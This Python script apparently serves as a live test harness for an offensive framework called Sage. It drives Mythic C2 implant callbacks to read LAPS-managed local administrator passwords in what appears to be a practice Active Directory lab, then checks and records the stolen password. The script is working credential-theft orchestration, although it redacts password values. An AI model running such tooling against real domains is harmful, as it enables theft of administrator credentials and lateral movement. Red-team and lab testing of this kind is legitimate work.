#!/usr/bin/env python3
"""Bounded live proof for generic managed local admin secret reads.

No LLM is used. The script builds Sage's payload-agnostic
`read-managed-local-admin-secret` capability into Mythic commands, executes them
from a selected callback, and records the effect only when plaintext managed
local admin password material is proven.
"""

from __future__ import annotations

import argparse
import ast
import asyncio
import json
import os
import re
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[3]
os.environ.setdefault("SAGE_ENGAGEMENT_GATE", "1")
os.environ.setdefault("SAGE_ENGAGEMENT_STATE_DIR", str(ROOT / "Payload_Type" / "sage" / ".sage_engagement"))

sys.path.insert(0, str(ROOT / "skills" / "sage-live-runner" / "scripts"))
from mythic import mythic  # noqa: E402
from sage_task import resolve_password  # noqa: E402

sys.path.insert(0, str(ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"))

import capabilities  # noqa: E402
import engagement_ledger  # noqa: E402
import mythic_tools  # noqa: E402

SERVER = "127.0.0.1"
USER = "mythic_admin"

LAPS_VALUE_RE = re.compile(r"(?im)^(\s*ms(?:-mcs-admpwd|laps-password)\s*[:=]\s*).+$")
ENCRYPTED_LAPS_RE = re.compile(r"(?im)^(\s*mslaps-encryptedpassword\s*[:=]\s*).+$")
MANAGED_SECRET_EXPECTED_PROBE = "extract_managed_local_admin_secret_probe"


def _redact(value: Any) -> Any:
    if isinstance(value, dict):
        return {key: _redact(item) for key, item in value.items()}
    if isinstance(value, list):
        return [_redact(item) for item in value]
    if isinstance(value, str):
        text = _display_text(value)
        text = LAPS_VALUE_RE.sub(r"\1<redacted>", text)
        return ENCRYPTED_LAPS_RE.sub(r"\1<redacted>", text)
    return value


def _display_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode(errors="replace")
    text = str(value)
    stripped = text.strip()
    if len(stripped) >= 3 and stripped[0] in "bB" and stripped[1] in {"'", '"'}:
        try:
            literal = ast.literal_eval(stripped)
            if isinstance(literal, bytes):
                text = literal.decode(errors="replace")
            elif isinstance(literal, str):
                text = literal
        except Exception:
            pass
    return text.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\r", "\n")


def _tail(value: Any, limit: int = 1800) -> str:
    return str(_redact(str(value or "")))[-limit:]


def _command_summary(command: dict[str, Any]) -> str:
    return json.dumps(_redact({
        "command": command.get("command"),
        "capability": command.get("capability"),
        "purpose": command.get("purpose"),
        "expected_probe": command.get("expected_probe"),
        "produces": command.get("produces"),
        "consumes": command.get("consumes"),
    }), sort_keys=True)


def _callback_payload_type(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
    payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
    return str(payload_type.get("name") or callback.get("payloadtype") or "")


async def _execute_plan_commands(
    tools: Any,
    commands: list[Any],
    callback_id: int,
    timeout: int,
) -> tuple[Any, int | None]:
    proof_output: Any = ""
    proof_task_id: int | None = None
    for command in commands:
        if not isinstance(command, dict):
            continue
        command_name = str(command.get("command") or "")
        if not command_name:
            continue
        print(f"\nissuing {_command_summary(command)}")
        output = await tools.issue_task_and_waitfor_task_output(
            command_name,
            command.get("parameters"),
            callback_id,
            timeout=timeout,
        )
        task_id = tools._last_issued_task_display_id
        expected_probe = str(command.get("expected_probe") or "").casefold()
        print(f"task_id={task_id} expected_probe={expected_probe}")
        print(f"output_tail:\n{_tail(output)}")
        if expected_probe == MANAGED_SECRET_EXPECTED_PROBE:
            proof_output = output
            proof_task_id = task_id
    return proof_output, proof_task_id


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--callback", type=int, default=int(os.environ.get("APOLLO_CB", "13")))
    parser.add_argument("--account", default=os.environ.get("MANAGED_SECRET_ACCOUNT", "cersei.lannister"))
    parser.add_argument("--account-domain", default=os.environ.get("MANAGED_SECRET_ACCOUNT_DOMAIN", "sevenkingdoms.local"))
    parser.add_argument("--target-host", default=os.environ.get("MANAGED_SECRET_TARGET_HOST", "braavos"))
    parser.add_argument("--target-domain", default=os.environ.get("MANAGED_SECRET_TARGET_DOMAIN", "essos.local"))
    parser.add_argument("--dc", default=os.environ.get("MANAGED_SECRET_DC", "meereen.essos.local"))
    parser.add_argument("--timeout", type=int, default=120)
    args = parser.parse_args()

    mythic_tools.ENGAGEMENT_GATE_ENABLED = True
    client = await mythic.login(server_ip=SERVER, username=USER, password=resolve_password())
    callbacks = await mythic.get_all_active_callbacks(client)
    callback = next((item for item in callbacks if int(item.get("display_id") or 0) == args.callback), {})
    if not callback:
        print(f"ERROR: callback {args.callback} not found")
        return 1
    print(
        f"target callback: cb{args.callback} payload={_callback_payload_type(callback)} "
        f"host={callback.get('host')} user={callback.get('user')}"
    )

    tools = mythic_tools.MythicTools(agent_task_id="focused-managed-secret-read")
    tools.client = client
    await tools._ensure_engagement_key()
    print(f"engagement: {tools._eng_key()}")
    original_objective = str(engagement_ledger.load(tools._eng_key()).get("objective") or "")

    action = capabilities.CapabilityAction(
        name="read-managed-local-admin-secret",
        target=(
            f"account={args.account.casefold()};account_domain={args.account_domain.casefold()};"
            f"target={args.target_host.casefold()};target_domain={args.target_domain.casefold()};"
            f"callback={args.callback}"
        ),
        preconditions=[
            f"kerberos-account-context:{args.account.casefold()}@{args.account_domain.casefold()}@callback:{args.callback}",
            (
                "can-read-managed-local-admin-secret:"
                f"{args.account.casefold()}@{args.account_domain.casefold()}->"
                f"{args.target_host.casefold()}@{args.target_domain.casefold()}"
            ),
        ],
        effects=[f"managed-local-admin-secret:{args.target_host.casefold()}@{args.target_domain.casefold()}"],
        intent={
            "capability": "read-managed-local-admin-secret",
            "account": args.account,
            "account_domain": args.account_domain,
            "target_host": args.target_host,
            "target_domain": args.target_domain,
            "callback_id": str(args.callback),
        },
    )
    raw_plan = await tools.build_capability_commands(action, {
        "domain_controller": args.dc,
    })
    plan = json.loads(raw_plan)
    print(f"builder ok={plan.get('ok')} reason={plan.get('reason')}")
    if not plan.get("ok"):
        print(json.dumps(_redact(plan), indent=2, sort_keys=True))
        return 1

    commands = list(plan.get("commands") or [])
    if not any(isinstance(command, dict) and command.get("command") for command in commands):
        print("ERROR: builder returned no commands")
        return 1
    output, task_id = await _execute_plan_commands(tools, commands, args.callback, args.timeout)
    if task_id is None:
        print("ERROR: builder returned no managed-secret proof command")
        return 1

    probe = capabilities.extract_managed_local_admin_secret_probe(output, args.target_host, args.target_domain)
    probe["callback_id"] = str(args.callback)
    probe["account"] = args.account.casefold()
    probe["account_domain"] = args.account_domain.casefold()
    verification = capabilities.verify_capability("read-managed-local-admin-secret", probe)
    print(f"managed_secret_verdict={verification.verdict} reason={verification.reason}")
    if verification.verdict != "achieved":
        print("RESULT: managed local admin secret was not proven in this bounded run")
        return 2

    recorded = tools.record_capability_result(
        action,
        probe,
        evidence={
            "source": "focused_managed_secret_read",
            "provenance": "run",
            "mythic_task_id": task_id,
            "callback_id": args.callback,
            "target_host": args.target_host.casefold(),
            "target_domain": args.target_domain.casefold(),
        },
    )
    if original_objective:
        data = engagement_ledger.load(tools._eng_key())
        data["objective"] = original_objective
        engagement_ledger.save(data, tools._eng_key())
    print(f"record verdict={recorded.verdict} reason={recorded.reason}")
    print(f"RESULT: achieved managed-local-admin-secret:{args.target_host.casefold()}@{args.target_domain.casefold()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
